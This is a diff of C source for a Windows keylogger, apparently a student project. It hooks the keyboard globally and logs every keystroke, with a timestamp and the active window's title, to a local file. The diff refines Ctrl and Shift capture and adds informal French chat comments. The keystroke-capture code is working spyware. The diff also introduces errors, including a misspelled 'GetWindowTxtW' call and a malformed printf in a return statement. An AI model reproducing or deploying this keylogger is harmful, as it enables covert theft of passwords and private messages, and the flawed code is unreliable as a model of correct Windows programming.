@@ -43,8 +43,10 @@ void    handleSpecial(int vkCode, char *key_pressed) {
         key_pressed = strdup("[CAPSLOCK]");
     else if (vkCode == VK_SHIFT)
         key_pressed = strdup("[SHIFT]");
-    else if (vkCode == VK_CONTROL)
-        key_pressed = strdup("[CTRL]");
+    else if (vkCode == VK_LCONTROL)
+        key_pressed = strdup("[LEFT CTRL]");
+    else if (vkCode == VK_RCONTROL)
+        key_pressed = strdup("[RIGHT CTRL]");
 }
 LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
     /*
@@ -71,13 +73,32 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
     if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
         getKeysState(&capsLock, &shift);
     GetKeyboardState(keyboard_state);
+    // printf("vkCode: %d\n", info->vkCode);
+    // C'est ici!
+    // Pour control il doit retourner 0
+    // faut checker les trucs spécial plus tôt.
+    // ok j'vais tester ici pour voir mdr -> Ok t'avais raison gg
+    // :ok_hand:
+    // :monkey_flip:
+    // Ok donc ca marchait pas car pour les touches CTRL, alt, etc, on a un buflen de 0 (make sense)
+    // C'est grave si on met >= 0 du coup? je pense pas que ce soit grave, faut tester -> okok j'vais tester thx
+    // btw effectivement sans les printf ca bug moins dans hookproc mais y'a toujours des ralentissements que je comprends pas
+    // je ferais un système de ring buffer quand on aura un truc stable, ça devrait aider.
+    // ca marche! J'suis chaud pour qu'on le fasse ensemble car j'en ai jamais fait et c'est interessant comme truc
+    // s'tu veux ! Le seul truc tricky là, c'est qu'on va utiliser des threads, et donc des opérations atomiques. C'est vraiment chiant à utiliser correctement.
+    // https://en.cppreference.com/w/cpp/atomic/memory_order
+    // on va s'amuser
+    // :sweat:
+
+
     int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
-    if (buf_len > 0)
+    if (buf_len >= 0)
     {
         buf[buf_len] = 0;
         WideCharToMultiByte(CP_UTF8, 0, buf, -1, key_pressed, 4, NULL, NULL);
         if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
-            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_CONTROL)
+            || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_LCONTROL
+            || info->vkCode == VK_RCONTROL || info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT)
             handleSpecial(info->vkCode, key_pressed);
 
         if (capsLock && !shift || !capsLock && shift)
@@ -88,7 +109,9 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
         GetLocalTime(&st);
         sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
         hwnd = GetForegroundWindow();
-        GetWindowTextW(hwnd, title, 256); // ici // oki merci
+        // GetWindowTextA(hwnd, title, 256); // ici // oki merci
+
+        GetWindowTxtW(hwnd, title, 256);
         sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
         fwrite(output, 1, strlen(output), f);
         fflush(f);
@@ -103,10 +126,7 @@ int main(void) {
     f = fopen("C:\\Users\\Buste\\Documents\\GitHub\\tinky-winkey\\log.txt", "w");
     kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
     if (!kbd_hook)
-    {
-        printf("hook installation failed: %d\n", GetLastError());
-        return (1);
-    }
+        return (printf("hook installation failed: %d\n", GetLastError(), 1));
 
     MSG msg;
     getKeysState(&capsLock, &shift);
